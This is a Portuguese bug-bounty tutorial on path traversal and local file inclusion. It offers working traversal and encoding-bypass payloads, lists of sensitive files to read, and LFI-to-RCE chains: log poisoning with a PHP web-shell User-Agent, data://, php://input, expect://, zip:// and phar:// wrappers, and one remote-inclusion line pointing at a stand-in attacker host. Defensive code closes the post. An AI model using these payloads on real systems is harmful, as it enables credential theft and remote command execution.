---
title: "LFI e Path Traversal: lendo arquivos que não deviam"
description: "Como sair de um inocente ../ até ler /etc/passwd, código-fonte e, com sorte, virar RCE — achando, explorando e corrigindo Path Traversal e Local File Inclusion."
author: matheus
date: 2026-06-03 23:48:00 -0300
categories: [Bug Bounty, Vulnerabilidades]
tags: ["LFI", "path traversal", "directory traversal", "RFI", "file inclusion", "PHP wrappers", "log poisoning", "OWASP", "bug bounty", "web security"]
image: /assets/img/covers/lfi-path-traversal.png
pin: false
comments: true
---

## Quando um "../" abre o cofre

Você está testando uma área de relatórios e percebe que a URL pra baixar um PDF é assim:

```
GET /relatorios/download?file=fatura-abril.pdf
```

A pergunta clássica de quem mexe com segurança não demora: *"e se eu não pedir `fatura-abril.pdf`, e sim um arquivo lá de fora?"*. Você troca por `../../../../etc/passwd`. A resposta volta `200 OK` e o corpo é a lista de usuários do sistema Linux — `root:x:0:0:root:/root:/bin/bash`, `www-data`, `sshd`, tudo. Em vez do seu PDF, o servidor te entregou um arquivo do sistema operacional.

Acabou de acontecer um **Path Traversal** que virou **leitura arbitrária de arquivos** (LFI). Esse tipo de falha vai de "interessante" a **crítica** muito rápido: dependendo do que dá pra ler — código-fonte, chaves, config com senha de banco — e de se dá pra escalar pra **execução de comando** (RCE), o bounty pula de algumas centenas a vários milhares de reais.

Neste post a gente vai do conceito de `../` até técnicas avançadas de bypass de filtro e de LFI virando RCE com PHP wrappers e log poisoning — com exploração passo a passo, caso prático e defesa de verdade. (Recon de superfícies de ataque a gente já viu no post [01 — Recon & Discovery](/posts/recon-discovery/); aqui foco no que é específico de arquivo.)

## O que é Path Traversal e o que é LFI?

São dois conceitos que andam de mãos dadas, mas não são a mesma coisa. Vale separar bem, porque a confusão entre eles é o que mais atrapalha quem está começando.

> **Analogia:** pense num arquivista numa biblioteca. Você pede um documento pelo número da prateleira. O arquivista **deveria** só pegar documentos daquela sala. **Path Traversal** é você falar "pega o documento três salas pra trás, na sala da diretoria" — e o arquivista, ingênuo, vai lá e traz. **LFI** é quando esse documento que você pediu não é só *entregue* a você: ele é **lido em voz alta como se fosse uma ordem** — ou seja, o servidor não só te mostra o conteúdo, ele **executa** o que está dentro.

Definindo com precisão:

- **Path Traversal** (ou **Directory Traversal**) — você manipula um caminho de arquivo (com `../`, caminho absoluto, encoding) pra **acessar arquivos fora do diretório pretendido**. O objetivo direto é **ler** (ou às vezes escrever) arquivos que estão fora da raiz prevista. É a [definição da OWASP](https://owasp.org/www-community/attacks/Path_Traversal): *"acessar arquivos e diretórios que estão armazenados fora da pasta raiz web"*.

- **LFI (Local File Inclusion)** — a aplicação **inclui/interpreta** um arquivo local cujo caminho veio (parcial ou totalmente) do usuário. O termo vem do mundo PHP: funções como `include`, `require`, `include_once` **executam** o conteúdo do arquivo como código. Por isso LFI é mais perigoso: além de ler, frequentemente dá pra **executar**.

A relação entre eles:

| | Path Traversal | LFI |
|---|---|---|
| **Operação no backend** | "abrir e mandar o conteúdo" (`readfile`, `fopen`, `File.read`) | "incluir e interpretar" (`include`, `require`) |
| **Resultado típico** | leitura de arquivo arbitrário | leitura **+** possível execução de código |
| **Linguagens** | qualquer (PHP, Java, .NET, Node, Python) | clássico de **PHP**, mas o conceito existe noutras |
| **Como vira RCE** | só com truque extra (escrever em local executável) | wrappers, log poisoning, `/proc/self/environ`... |

Na prática, **todo LFI começa com um Path Traversal** (você precisa apontar pro arquivo que quer). A diferença é o que o servidor faz com o caminho: se ele só lê → traversal/leitura arbitrária; se ele inclui/executa → LFI.

### E o RFI?

**RFI (Remote File Inclusion)** é o primo do LFI: em vez de incluir um arquivo *local*, a aplicação inclui um arquivo de uma **URL remota** que você controla (`?page=http://atacante.com/shell.txt`). É instantaneamente RCE — você hospeda o código malicioso e o servidor o executa. Hoje é raro, porque depende de `allow_url_include = On` no PHP, que vem **desligado por padrão** desde o PHP 5.2. Vamos focar em LFI, que é o que você realmente encontra; RFI fica como menção honrosa.

## Por que isso importa (e quanto paga)

O impacto escala em degraus bem definidos — e o bounty acompanha:

- **Leitura de config e segredos.** Ler `/etc/passwd` já confirma a falha, mas o ouro está em `config.php`, `.env`, `application.yml`, `web.config`, `wp-config.php`: ali moram credenciais de banco, chaves de API, secrets de JWT. De posse disso, você pivota pra dentro.

  > 💡 **JWT** (JSON Web Token): token de sessão em 3 partes `header.payload.signature` (Base64URL); o *secret* assina ele. Detalhe no [Glossário](/posts/fundamentos-web-hacking/).
- **Leitura de código-fonte.** Com `php://filter` dá pra baixar o **fonte** da aplicação em base64 (veja adiante). Código na mão = mapa de outras vulnerabilidades.

  > 💡 **Base64**: forma de representar bytes só com letras/números (não é criptografia — qualquer um decodifica). Detalhe no [Glossário](/posts/fundamentos-web-hacking/).
- **Vazamento de PII / arquivos de outros usuários.** Path traversal num endpoint de download pode ler arquivos de outros clientes (cruza com [IDOR — post 10](/posts/broken-access-control-idor-bola-bfla/)). (**PII** = dados pessoais identificáveis: nome, CPF, e-mail.)
- **LFI → RCE.** O topo da cadeia. Quando você consegue fazer o servidor **executar** o que controla (log poisoning, wrappers), virou execução remota de comando — severidade **crítica**.

Faixas realistas pra essa família em programas de bug bounty: de **algumas centenas de reais/dólares** (leitura de arquivo de baixo valor, ou um LFI que só lê `/etc/passwd` num sistema sem dados sensíveis) até **vários milhares** (config com credenciais, vazamento de PII em escala, ou LFI escalado pra RCE). O que define o cifrão é **o que você consegue ler** e **se dá pra executar**.

> ⚠️ **Cheque o escopo e seja cirúrgico.** Pra *provar* a falha, leia um arquivo inofensivo (`/etc/passwd`, `win.ini`). **Não** saia baixando dados de clientes nem dumpando todo o banco — isso pode te tirar do programa e configurar dano real. PoC mínima, impacto explicado. (**PoC** = *Proof of Concept*, a prova mínima de que a falha existe.)

## Como funciona por trás

A raiz é quase sempre a mesma: o backend **concatena entrada do usuário num caminho de arquivo** e abre/inclui sem validar. Olha o pecado original em PHP:

```php
// Backend VULNERÁVEL — concatena o que veio do cliente direto no caminho
$file = $_GET['file'];
include "/var/www/app/pages/" . $file;   // <- entrada não validada no caminho
```

A intenção do dev era servir `pages/home.php`, `pages/sobre.php`. Mas o sistema de arquivos entende `../` como "sobe um diretório". Então quando você manda:

```
?file=../../../../etc/passwd
```

o caminho final que o `include` resolve é:

```
/var/www/app/pages/../../../../etc/passwd   ->  /etc/passwd
```

Cada `../` "come" um nível pra trás. Você joga `../` suficientes pra chegar na raiz `/` e de lá navega pro arquivo que quer. No Windows é a mesma ideia com `..\` (barra invertida), mas o Windows aceita as duas (`/` e `\`), então `../` costuma funcionar também.

> **Por que tantos `../`?** Você nem sempre sabe a profundidade exata do diretório base. `/etc/passwd` está na raiz, e jogar `../` **a mais** não causa erro — `/` é o teto, subir além dela continua em `/`. Por isso o padrão é mandar uns 6–10 `../` "de sobra" e garantir que chegou na raiz. É puro pragmatismo, não mágica.

O mesmo vale em outras linguagens — só muda a função que lê/inclui:

```javascript
// Node.js VULNERÁVEL
const file = req.query.file;
res.sendFile("/var/www/uploads/" + file);   // path traversal aqui
```

```java
// Java VULNERÁVEL
File f = new File("/var/www/data/" + request.getParameter("file"));
return Files.readAllBytes(f.toPath());
```

## Tipos e variações

1. **Traversal puro na URL/query** — `?file=../../etc/passwd`. O clássico.
2. **Traversal no corpo (POST/PUT)** — o parâmetro de arquivo vai no JSON ou form-data, não na URL.
3. **Traversal no nome de arquivo de upload** — você controla o `filename` num multipart e usa `../` pra **escrever** fora da pasta de uploads.
4. **LFI puro (PHP)** — `include`/`require` com input → leitura **e** execução em potencial.
5. **RFI** — inclusão de URL remota (raro, precisa de `allow_url_include`).
6. **LFI via wrapper** — `php://filter`, `data://`, `expect://`, `php://input`, `zip://`/`phar://` (seções avançadas).
7. **Traversal "indireto"** — não é você que põe o caminho; a aplicação monta um caminho a partir de um valor seu (um `template=`, um `lang=`, um `theme=`) e você abusa disso.

## Recon — como encontrar

Primeiro você precisa achar **onde a aplicação toca em arquivos por nome**. Os sinais de superfície:

- **Parâmetros que cheiram a arquivo/caminho:** `file`, `path`, `page`, `template`, `doc`, `download`, `id`, `name`, `folder`, `lang`, `view`, `include`, `pdf`, `img`, `style`, `report`.
- **Funcionalidades que servem arquivos:** download de relatório/nota fiscal, preview de anexo, troca de idioma/tema (carrega `pt.php`/`en.php`), geração de PDF, visualizador de imagem.
- **Extensões na URL:** se a URL termina em `.pdf`, `.log`, `.xml`, `.ini` vindo de um parâmetro, é candidata forte.

> 💡 **O gatilho é o NOME do parâmetro, não o método.** Se um parâmetro **referencia um arquivo** (`file=algo.pdf`), ele subentende que esse arquivo mora num diretório — então tente navegar com `../`. E teste em **qualquer método**: LFI via `POST` (no corpo, no form-data) é tão válido quanto via `GET` — **o método não importa**. Não filtre só os parâmetros "óbvios": teste **todos** os que cheiram a caminho, em toda request que sua interceptação capturar.

Pra descobrir parâmetros e endpoints escondidos (ferramentas que a gente apresentou no [post 01 — Recon](/posts/recon-discovery/)):

```bash
# gau lista URLs históricas (Wayback/Common Crawl) do alvo;
# grep pega só as que têm parâmetro com cheiro de arquivo
echo "alvo.com" | gau | grep -Ei '(\?|&)(file|path|page|doc|template|download|lang|view)='
```

```bash
# ffuf faz fuzzing de PARÂMETRO: testa nomes de query string num endpoint
# (-w wordlist de parâmetros; FUZZ é o ponto de injeção; -fs filtra tamanho da resposta "normal")
ffuf -u "https://alvo.com/index.php?FUZZ=../../../../etc/passwd" \
     -w params.txt -fs 1234
```

E uma forma rápida de varrer um parâmetro suspeito com payloads de traversal já prontos:

```bash
# nuclei tem templates de LFI/traversal; aponta pro alvo e ele testa os payloads conhecidos
nuclei -u "https://alvo.com/relatorios/download?file=FUZZ" -tags lfi,traversal
```

> 💡 **Sinal de ouro:** se ao trocar o valor do parâmetro por um arquivo que **não existe** o app devolve um erro tipo `failed to open stream: No such file or directory in /var/www/...`, comemore baixinho — esse erro **te entrega o caminho absoluto** e confirma que o input vai parar num `fopen`/`include`. Metade do trabalho é vazar essa pista.

## Exploração passo a passo (do básico ao avançado)

Trabalhe sempre no **Burp Repeater** — você manda a request, troca o payload e lê a resposta sem ruído. (Burp Suite apresentado no [post 00 — Fundamentos](/posts/fundamentos-web-hacking/).)

### Nível 1 — Traversal básico

Confirme com um arquivo que existe em todo lugar e é inofensivo:

```http
GET /relatorios/download?file=../../../../../../etc/passwd HTTP/2
Host: alvo.com
```

```http
HTTP/2 200 OK
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

No **Windows**, o equivalente universal é o `win.ini` (sempre existe e é inofensivo):

```
?file=..\..\..\..\..\..\windows\win.ini
```

### Nível 2 — Bypass de prefixo de pasta (validação "tem que começar com a base")

Filtro comum: o backend exige que o caminho **comece** com a pasta esperada (`/var/www/images`). Solução: comece com ela e depois suba com `../`. [PortSwigger confirma esse payload exato](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path):

```
?file=/var/www/images/../../../etc/passwd
```

O caminho começa com `/var/www/images` (passa na checagem ingênua) e os `../` te levam de volta à raiz.

### Nível 3 — Bypass de filtro que remove "../"

Muito dev "resolve" o problema dando um `str_replace("../", "", $input)` — removendo as sequências `../`. O problema é que isso roda **uma vez só** e **não é recursivo**. Então você aninha:

```
....//....//....//etc/passwd
```

Olha o que acontece passo a passo: o filtro varre a string e remove cada ocorrência de `../`. Em `....//`, o `../` do meio é removido, sobrando `../`. Ou seja, **depois** da limpeza, `....//` vira `../`. O [PortSwigger documenta exatamente essa técnica](https://portswigger.net/web-security/file-path-traversal): *"você pode usar sequências de traversal aninhadas, como `....//` ou `....\/`, que revertem pra sequências simples quando a sequência interna é removida"*. Variações que valem testar quando o filtro é mais agressivo: `..././`, `....\/`, `..//////..//`.

### Nível 4 — Bypass por encoding

Se o filtro busca a string literal `../`, ofusque com URL encoding. O servidor decodifica **depois** do filtro, e aí o `../` ressurge:

| Payload | Decodifica pra | Quando usar |
|---|---|---|
| `%2e%2e%2f` | `../` | URL encoding simples de `../` |
| `%2e%2e%5c` | `..\` | versão Windows (`\`) |
| `%252e%252e%252f` | `../` | **duplo encoding** (`%25` = `%`) — quando há 2 camadas de decode |
| `..%c0%af` | `../` | overlong UTF-8 do `/` (servidores/proxies legados) |
| `..%ef%bc%8f` | `../` | fullwidth Unicode do `/` (não-padrão) |

O **duplo encoding** merece um momento didático. Imagine que o app decodifica a URL uma vez (normal), aplica o filtro buscando `../`, e depois algum componente decodifica **de novo**. Você manda `%252e%252e%252f`. Primeiro decode → `%2e%2e%2f` (não bate no filtro de `../`). Segundo decode → `../`. O filtro foi enganado porque olhou a string no momento errado. Tudo isso está catalogado no [PortSwigger sobre file path traversal](https://portswigger.net/web-security/file-path-traversal).

### Nível 5 — Null byte (legado, mas saiba que existe)

Às vezes o backend **força uma extensão**, concatenando `.php` ou `.pdf` no fim do seu input (`include($_GET['file'] . ".php")`). Em **PHP < 5.3.4**, o byte nulo `%00` **terminava a string** no nível do C, descartando o sufixo:

```
?file=../../../../etc/passwd%00
# o backend monta "../../../../etc/passwd\0.php" -> o C para no \0 -> lê /etc/passwd
```

> ⚠️ **Isso é legado.** Foi corrigido no PHP 5.3.4 (2010). Não conte com `%00` em alvo moderno — mas você ainda esbarra nele em sistemas antigos, e precisa **reconhecer** a técnica num CTF ou num legado esquecido. Pra contornar extensão fixa em PHP moderno, o caminho é o `php://filter` (a seguir).

### Nível 6 — Arquivos que valem a pena ler

Confirmou a falha? Agora aponte pros arquivos com valor:

**Linux:**

| Arquivo | Por quê |
|---|---|
| `/etc/passwd` | confirma a falha; lista usuários |
| `/etc/hosts` | mapeamento interno de hosts |
| `/proc/self/environ` | variáveis de ambiente do processo (às vezes com segredos; e vetor de RCE) |
| `/proc/self/cmdline` | a linha de comando do processo |
| `/var/log/apache2/access.log`, `/var/log/nginx/access.log` | logs (vetor de log poisoning) |
| `/var/www/html/config.php`, `.env`, `application.yml`, `wp-config.php` | **credenciais** — o prêmio |
| `~/.ssh/id_rsa`, `~/.bash_history` | chaves e histórico |

**Windows / IIS:**

| Arquivo | Por quê |
|---|---|
| `C:\Windows\win.ini`, `system.ini` | confirma a falha; inofensivo |
| `C:\Windows\System32\drivers\etc\hosts` | mapeamento de hosts |
| `web.config` | **config do IIS/.NET** — strings de conexão, segredos |
| `C:\Windows\debug\mrt.log` | log do sistema, ótimo pra confirmar leitura |

## Avançado: LFI → RCE

Aqui o jogo muda. Se a aplicação **inclui/interpreta** o arquivo (PHP `include`), e você consegue colocar **código PHP** num arquivo que o servidor depois inclui, você executa comando. Três caminhos clássicos. (O destino é o mesmo da execução de comando que vimos no [post 15 — RCE, Command Injection & SSTI](/posts/rce-command-injection-ssti/); aqui a porta de entrada é a inclusão de arquivo.)

### 1) `php://filter` — vazar o código-fonte em base64

Não é RCE direto, mas é o primeiro passo: ler o **fonte** das páginas. Se você incluir um `.php` diretamente, ele **executa** e você só vê o HTML de saída, não o código. O wrapper `php://filter` resolve isso: ele aplica um filtro de conversão (base64) **antes** da inclusão, então o que volta é o fonte codificado, sem executar:

```http
GET /index.php?page=php://filter/convert.base64-encode/resource=config HTTP/2
Host: alvo.com
```

A resposta vem em base64; você decodifica e lê o `config.php` com as credenciais:

```bash
echo "PD9waHAgJGRiX3Bhc3M9..." | base64 -d
# <?php $db_pass="..."; ...
```

> **Por que base64?** Porque o fonte tem `<`, `>`, `?` e quebras que sujariam a resposta ou seriam interpretados. Codificar em base64 entrega o conteúdo **íntegro e cru**. Esse wrapper funciona sem `allow_url_include` (é fluxo local). Existe também a técnica avançada de **PHP filter chains** (encadear filtros pra *gerar* bytes arbitrários e chegar a RCE só com `php://filter`) — automatizada pelo [`php_filter_chain_generator.py` da Synacktiv](https://github.com/synacktiv/php_filter_chain_generator); documentada no [HackTricks — LFI2RCE via PHP Filters](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html).

### 2) Log poisoning — envenenar o log e incluí-lo

A ideia é linda na sua simplicidade: o servidor **escreve o que você manda** em arquivos de log (User-Agent, URL, etc.). Se você consegue **ler** esse log via LFI, e ele contém código PHP que você plantou, o `include` **executa** esse código.

**Passo 1 — envenenar.** Mande uma request cujo `User-Agent` é PHP. O Apache grava isso no `access.log`:

```http
GET / HTTP/1.1
Host: alvo.com
User-Agent: <?php system($_GET['cmd']); ?>
```

**Passo 2 — incluir o log e disparar o comando:**

```http
GET /index.php?page=../../../../var/log/apache2/access.log&cmd=id HTTP/2
Host: alvo.com
```

Quando o PHP inclui o `access.log`, ele encontra `<?php system($_GET['cmd']); ?>` no meio do texto e **executa** — rodando `id`. Saída esperada: `uid=33(www-data) gid=33(www-data)`. Note que o caminho do log varia: Apache em Debian/Ubuntu é `/var/log/apache2/access.log`; em RHEL/CentOS é `/var/log/httpd/access_log`; Nginx é `/var/log/nginx/access.log`.

> **Por que funciona:** o `include` do PHP não liga se o arquivo se chama `.log` — ele lê o conteúdo e executa **qualquer** trecho `<?php ... ?>` que encontrar. O log virou um arquivo PHP "sujo" que você controla parcialmente.

> 🎯 **Variante poderosa — envenenar o log do WAF (visto na máquina CyberWaf, HackingClub).** Quando o alvo roda **ModSecurity**, há uma ironia útil: o WAF que **bloqueia** seu ataque também **registra** a request inteira no log de auditoria (`modsec_audit.log`). Ou seja, mesmo levando `403 Forbidden`, seu payload **foi gravado**. Se esse log é incluível via LFI, você o envenena *através do próprio WAF* e depois inclui pra executar:
> ```bash
> # 1) o WAF bloqueia (403), mas grava o User-Agent com PHP no modsec_audit.log
> curl -s -A '<?php system($_GET["cmd"]); ?>' "http://alvo/?x=' OR '1'='1"
> # 2) inclui o log de auditoria via LFI e dispara o comando
> curl -s -b "PHPSESSID=..." "http://admin.alvo/admin?log=../../../../../var/log/apache2/modsec_audit&cmd=id"
> ```
> O caminho/extensão dependem do `SecAuditLog` configurado. **Lição:** "o WAF bloqueou" ≠ "o payload sumiu" — ele pode estar guardado num log que você consegue incluir.

### 3) Wrappers que executam diretamente

PHP tem wrappers que entregam código pra inclusão sem precisar de log. Cada um tem um pré-requisito de configuração — **saiba qual**, porque é isso que define se vai funcionar:

```http
# data:// — embute o payload na própria URL (base64). Decodificado:
#   <?php system($_GET['cmd']); ?>
# PRÉ-REQUISITO: allow_url_include = On
GET /index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B&cmd=id HTTP/2
```

```http
# php://input — o corpo do POST É o código incluído.
# PRÉ-REQUISITO: allow_url_include = On
POST /index.php?page=php://input&cmd=id HTTP/2
Content-Type: text/plain

<?php system($_GET['cmd']); ?>
```

```http
# expect:// — executa comando direto no shell.
# PRÉ-REQUISITO: extensão "expect" carregada (não vem por padrão)
GET /index.php?page=expect://id HTTP/2
```

Resumo dos pré-requisitos (confirmado em [The Hacker Recipes — PHP wrappers and streams](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams)):

| Técnica | Precisa de | Default? |
|---|---|---|
| `php://filter` (ler fonte) | nada (fluxo local) | ✅ funciona |
| Log poisoning | conseguir ler o log + escrever nele | depende do app |
| `data://` | `allow_url_include = On` | ❌ Off por padrão |
| `php://input` | `allow_url_include = On` | ❌ Off por padrão |
| `expect://` | extensão `expect` instalada (não usa `allow_url_include`) | ❌ raríssimo |
| `zip://` / `phar://` | conseguir **subir/escrever** um arquivo no servidor | depende de upload |
| `phar://` (desserialização) | gadget/POP chain na base de código | ❌ só PHP < 8.0 |

E o **`/proc/self/environ`**: em sistemas Linux antigos, esse "arquivo" contém as variáveis de ambiente do processo, **incluindo o User-Agent** que você enviou. Mesma lógica do log poisoning: injete PHP no `User-Agent`, inclua `/proc/self/environ`, e o PHP nele executa. Hoje costuma vir com permissão de leitura restrita, mas é parte do repertório clássico.

### 4) `zip://` e `phar://` — quando você consegue subir um arquivo

Se a app tem **upload** (mesmo de imagem/anexo) **e** um LFI, esses dois wrappers transformam um arquivo seu em código executável:

- **`zip://`** — você sobe um `.zip` contendo um `shell.php` lá dentro e aponta o LFI pra ele. O wrapper usa `#` pra separar o arquivo interno (a `#` precisa ir URL-encoded como `%23`):

```http
# o upload virou /uploads/payload.zip e dentro dele há "shell.php"
GET /index.php?page=zip://./uploads/payload.zip%23shell.php&cmd=id HTTP/2
```

- **`phar://`** — duplamente útil. (a) Como container: sobe um `.phar` (ou um polyglot `.jpg` que também é `.phar` válido) com código dentro e inclui `phar://./uploads/x.jpg/shell.php`. (b) Como gatilho de **desserialização**: ao tocar um `.phar` com **qualquer** função de filesystem (`file_exists`, `fopen`, `include`, `is_file`...), o PHP **desserializa automaticamente os metadados** do Phar — e se existir uma POP chain (gadget) na base de código, isso vira RCE *sem nem precisar incluir o arquivo*.

> ⚠️ **Pré-requisitos e limites.** `zip://`/`phar://` não dependem de `allow_url_include` (são fluxo local), mas **dependem de você conseguir colocar o arquivo no servidor** (upload, log, qualquer escrita controlada). A desserialização automática do `phar://` foi **desativada no PHP 8.0** — em alvo moderno conte com o uso "container" (incluir código de dentro do arquivo), não com a desserialização. Documentado no [The Hacker Recipes — PHP wrappers and streams](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams) e no paper de referência [BlackHat 2018 — "It's a PHP Unserialization Vulnerability..."](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf).

## Caso real-fictício: Path Traversal sem autenticação em IIS/ASP.NET

> Cenário **fictício, baseado em padrões reais** de programas de bug bounty (anonimizado).

Você está testando `app.exemplo.com`, um sistema de consulta de relatórios sobre **IIS / ASP.NET**. Há um endpoint que recebe o nome do arquivo num parâmetro `file`. Não exige login.

**Passo 1 — Confirmar.** No Repeater, troco o valor do `file` por um path traversal apontando pra um log do Windows (inofensivo, sempre presente):

```http
POST /consulta/relatorio HTTP/1.1
Host: app.exemplo.com
Content-Type: application/x-www-form-urlencoded

file=..\..\..\..\..\..\..\..\windows\debug\mrt.log    # <- traversal aqui
```

```http
HTTP/1.1 200 OK
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Content-Type: text/plain

Microsoft Windows Malicious Software Removal Tool ...
Successfully Submitted MRT telemetry ...
```

O servidor devolveu o conteúdo do `mrt.log` — leitura arbitrária confirmada, **sem autenticação**.

**Passo 2 — Subir o valor.** Agora aponto pra arquivos de configuração do sistema e da aplicação, que valem de verdade:

```http
file=..\..\..\..\..\..\windows\System32\drivers\etc\hosts
```

```http
file=..\..\..\..\web.config    # <- strings de conexão / segredos do .NET
```

Se o `web.config` voltar com `<connectionStrings>`, você tem credenciais de banco — e o report sai de "leitura de arquivo" pra "exposição de credenciais".

**O que a tela do Burp mostraria:** painel Request/Response lado a lado; na Request o parâmetro `file` com a sequência de `..\` destacada em vermelho; na Response o `200 OK`, header `Server: Microsoft-IIS/8.5` e o corpo com o conteúdo do arquivo do sistema. Em uma PoC responsável, **pare** no `hosts`/`win.ini` — não dumpe o `web.config` inteiro num programa real sem necessidade; documente que ele é alcançável.

**Passo 3 — Report.** Título: `[Path Traversal] Leitura arbitrária de arquivos sem autenticação via parâmetro "file"`. Resumo no risco ao negócio: *"qualquer pessoa não autenticada consegue ler arquivos do servidor (config, logs, segredos), o que permite roubo de credenciais e movimentação lateral"*. Passos numerados + prints. Calibre a severidade pelo que **você de fato provou**:

- **Leitura arbitrária de arquivo, sem autenticação** (o que foi comprovado aqui): `CWE-22` (Path Traversal).
  - **CVSS v3.1:** `7.5` (Alto) — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (pela rede, sem login, sem interação; só confidencialidade — você lê, não escreve).
  - **CVSS v4.0 (CVSS-B):** `8.7` — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` (mesmo perfil; o estrago fica no sistema vulnerável, sem impacto subsequente — é o vetor do Heartbleed, exemplo oficial do FIRST).
- **Se escalar pra RCE** (log poisoning/wrapper executando comando): aí muda de classe — `CWE-98` (*Improper Control of Filename for Include/Require em PHP* — o nome oficial enfatiza *PHP Remote File Inclusion*) e o vetor canônico de RCE remoto sobe pra **v3.1 `9.8`** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) / **v4.0 `9.3`** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`).

> ⚠️ **Não copie o número da v3.1 pra v4.0** — recalcule na [calculadora oficial v4.0](https://www.first.org/cvss/calculator/4.0). E reporte o que **provou**: se só leu arquivo, é `7.5`/`8.7`; só suba pra `9.8`/`9.3` quando demonstrar execução de comando. (Como calibrar score e citar CWE: [post 02 — Severidade & Impacto](/posts/severidade-impacto-triagem/); como estruturar o report pra pagar: [post 03 — Report que paga](/posts/como-escrever-report-que-paga/).)

### Bônus — traversal "embrulhado": LFI no Jolokia

Um padrão que aparece em stacks Java/Spring: o **Jolokia** (ponte HTTP pra MBeans do JMX) exposto via Spring Boot Actuator. O MBean `DiagnosticCommand` tem a operação `compilerDirectivesAdd`, que recebe um **caminho de arquivo** e, ao falhar, devolve o conteúdo dele numa mensagem de erro — efetivamente um LFI sem autenticação. O caminho usa `!` como separador (sintaxe do Jolokia):

```http
GET /actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd HTTP/1.1
Host: app.exemplo.com
```

A resposta JSON `200` traz o `/etc/passwd`. Lição: traversal/LFI nem sempre é um parâmetro `file=` óbvio — às vezes está **embrulhado** numa API de gerenciamento exposta sem querer. Isso conversa com o [post 11 — Security Misconfiguration & CVE Hunting](/posts/security-misconfiguration-cve-hunting/), porque a raiz aqui é um endpoint de management exposto. Toolkit de referência: [jolokia-exploitation-toolkit](https://github.com/laluka/jolokia-exploitation-toolkit).

## Defesa em camadas

Não existe bala de prata única — você combina camadas. E a regra mestra: **nunca concatene input do usuário direto num caminho de arquivo.**

**1. Allowlist de arquivos (a defesa mais forte).** Se o conjunto de arquivos servíveis é conhecido, mapeie um identificador → caminho. O usuário **nunca** vê nem controla o caminho real:

```php
// CORRETO — o usuário escolhe uma CHAVE, não um caminho
$permitidos = [
    'fatura'   => '/var/www/docs/fatura.pdf',
    'manual'   => '/var/www/docs/manual.pdf',
];
$key = $_GET['doc'] ?? '';
if (!isset($permitidos[$key])) {
    http_response_code(404);
    exit;
}
readfile($permitidos[$key]);   // caminho 100% controlado pelo servidor
```

**2. Canonicalize e valide o prefixo (quando precisa aceitar nome de arquivo).** Resolva o caminho **real** (eliminando `../`, symlinks) e confirme que ele ainda está **dentro** da pasta permitida:

```php
// PHP — realpath() resolve ../ e symlinks; depois checa o prefixo
$base = realpath('/var/www/uploads');
$alvo = realpath($base . '/' . basename($_GET['file']));  // basename tira diretórios

if ($alvo === false || strpos($alvo, $base . DIRECTORY_SEPARATOR) !== 0) {
    http_response_code(403);
    exit;   // tentou sair da pasta -> bloqueado
}
readfile($alvo);
```

```javascript
// Node.js — path.resolve canonicaliza; verifica se ainda começa na base
const path = require('path');
const base = path.resolve('/var/www/uploads');
const alvo = path.resolve(base, path.basename(req.query.file)); // basename remove ../

if (!alvo.startsWith(base + path.sep)) {
  return res.sendStatus(403);
}
res.sendFile(alvo);
```

```java
// Java — getCanonicalPath resolve ../; compara com a base canônica
File base = new File("/var/www/uploads").getCanonicalFile();
File alvo = new File(base, new File(req.getParameter("file")).getName()).getCanonicalFile();

if (!alvo.getPath().startsWith(base.getPath() + File.separator)) {
    resp.sendError(403);
    return;
}
Files.copy(alvo.toPath(), resp.getOutputStream());
```

> **Por que `realpath`/`getCanonicalPath` e não regex?** Porque tentar "limpar" `../` na mão é um jogo perdido — sempre tem um encoding, um aninhamento, um `....//` que escapa (vide a seção de bypass inteira acima). Canonicalizar pede pro **próprio SO** resolver o caminho final, e aí você compara o resultado **real** com a base. É robusto porque trabalha *depois* de toda a ofuscação ter sido resolvida.

**3. Desligue o que você não usa (defesa de configuração PHP):**

```ini
; php.ini — corta RFI e os wrappers de RCE de uma vez
allow_url_fopen  = Off
allow_url_include = Off
; remova a extensão "expect" se estiver instalada
```

**4. Isolamento (jail/chroot/container).** Mesmo que algo escape, limite o estrago: rode o processo num **chroot** ou container com sistema de arquivos mínimo e usuário sem privilégio. Assim, ler `/etc/passwd` devolve o passwd vazio do container, e não há `web.config` cheio de segredo ao alcance. É a camada de "contenção de dano".

**5. Não interprete o que não precisa ser interpretado.** Se é pra *baixar* um arquivo, use `readfile`/`sendFile` (lê e manda os bytes) — **nunca** `include`/`require` (executa). Trocar a função certa elimina a classe LFI→RCE inteira.

> ❌ **O que NÃO basta:** dar um `str_replace('../', '', $x)` (aninhamento e encoding furam); confiar que `.php` colado no fim "protege" (`php://filter` e null byte legado contornam); validar só no front-end; usar blocklist de nomes de arquivo (sempre falta um). A allowlist + canonicalização é o que de fato fecha.

## Ferramentas + labs legais

- **Burp Suite** — Repeater (trocar payloads), Intruder (varrer profundidade de `../` e listas de arquivos). Extensão de wordlists úteis.
- **ffuf / nuclei** — fuzzing de parâmetro e templates de LFI/traversal prontos.
- **LFISuite / fimap / dotdotpwn** — fuzzers especializados em traversal/LFI (úteis pra automatizar bypass de encoding).
- **`php_filter_chain_generator.py`** — gera filter chains pra LFI→RCE só com `php://filter`.
- **Labs pra praticar (autorizados):**
  - [PortSwigger Web Security Academy — File path traversal](https://portswigger.net/web-security/file-path-traversal) (a melhor fonte gratuita; todos os bypasses têm lab).
